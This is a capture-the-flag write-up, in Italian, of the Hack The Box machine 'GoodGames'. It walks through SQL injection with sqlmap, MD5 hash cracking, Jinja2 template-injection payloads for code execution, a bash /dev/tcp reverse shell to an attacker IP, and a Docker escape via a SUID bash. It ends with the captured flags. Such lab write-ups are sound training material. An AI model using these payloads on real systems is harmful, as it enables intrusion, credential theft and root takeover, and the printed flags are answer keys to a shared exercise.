# GoodGames — HTB Writeup

**OS:** Linux | **Difficulty:** Easy | **IP:** 10.129.23.161

---

## Enumeration

### Nmap

```
nmap -sC -sV goodgames.htb

PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.9.2)
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
```

Solo la porta 80 aperta — applicazione Flask/Python.

### Web

Aggiunta la voce a `/etc/hosts`:

```
10.129.23.161  goodgames.htb
```

Enumerazione directory con gobuster:

```bash
gobuster dir -u http://goodgames.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html --exclude-length 9265
```

Risultati:

```
/login               [200]
/signup              [200]
/profile             [200]
/blog                [200]
/forgot-password     [200]
```

![[Screenshot_2026-04-21_at_16-52-07_GoodGames_Community_and_Store.png]]

---

## Foothold

### SQL Injection

Il campo email del login è vulnerabile a SQL Injection. Rilevata con sqlmap:

```bash
sqlmap -u http://goodgames.htb/login --data="email=test&password=test" --dbs --batch
```

```
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)

available databases:
[*] information_schema
[*] main
```

![[Screenshot_2026-04-21_16-38-47.png]]

Dump della tabella `user` nel database `main`:

```bash
sqlmap -u http://goodgames.htb/login --data="email=test&password=test" -D main -T user --dump --batch
```

```
| id | email               | name  | password                         |
| 1  | admin@goodgames.htb | admin | 2b22337f218b2d82dfc3b6f77e7cb8ec |
```

### Hash Cracking

Hash MD5 crackato con hashcat:

```bash
hashcat -m 0 2b22337f218b2d82dfc3b6f77e7cb8ec /usr/share/wordlists/rockyou.txt
```

```
2b22337f218b2d82dfc3b6f77e7cb8ec:superadministrator
```

**Credenziali:** `admin@goodgames.htb : superadministrator`

### Internal Administration Panel

Effettuato il login su `goodgames.htb`. L'icona ingranaggio in alto a destra redirige a `internal-administration.goodgames.htb`. Aggiunto a `/etc/hosts` e visitato il pannello Flask Volt.

Password reuse — login con `admin : superadministrator`.

### SSTI (Server Side Template Injection)

Il pannello Flask Volt è vulnerabile a SSTI su Jinja2. Nel campo Full Name della pagina Settings, testato il payload:

```
{{7*7}}
```

Il risultato `49` conferma l'esecuzione. Usato per ottenere RCE:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Output: `uid=0(root) gid=0(root) groups=0(root)`

### Reverse Shell

Listener:

```bash
nc -lnvp 4444
```

Payload nel campo Full Name:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.15.211/4444 0>&1"').read() }}
```

Shell ottenuta come `root` nell'hostname `3a453ab39d3d` — container Docker.

![[Screenshot_2026-04-21_17-11-01.png]]

---

## Privilege Escalation

### Docker Escape via Mounted Home Directory

La home di `augustus` (`/home/augustus`) è montata nel container con flag read/write.

Essendo root nel container, è possibile modificare i permessi di file che si riflettono sull'host.

**Step 1** — SSH sull'host come augustus (password reuse):

```bash
ssh augustus@172.19.0.1
# password: superadministrator
cp /bin/bash .
exit
```

**Step 2** — Nel container come root, impostare SUID su bash:

```bash
chown root:root /home/augustus/bash
chmod 4755 /home/augustus/bash
```

**Step 3** — SSH di nuovo come augustus ed eseguire:

```bash
./bash -p
```

Output: `uid=1000(augustus) gid=1000(augustus) euid=0(root)`

---

## Flags

**User flag** (`/home/augustus/user.txt`):

```
070b1683d3e70752fb80e0eead37f083
```

**Root flag** (`/root/root.txt`):

```
2adcbac53227053305e794eb9ef3db3a
```

![[1776785679349_image.png]]